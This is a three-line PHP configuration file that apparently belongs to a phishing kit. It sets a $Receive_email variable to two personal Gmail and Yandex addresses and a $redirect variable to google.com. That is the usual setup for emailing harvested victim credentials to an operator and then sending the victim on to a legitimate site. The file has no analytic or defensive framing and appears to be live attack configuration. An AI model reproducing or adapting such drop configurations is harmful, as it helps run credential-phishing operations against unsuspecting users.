<?php 
$Receive_email="leo.kwsteel@gmail.com,mayank5hah@yandex.com";
$redirect="https://www.google.com/";
?>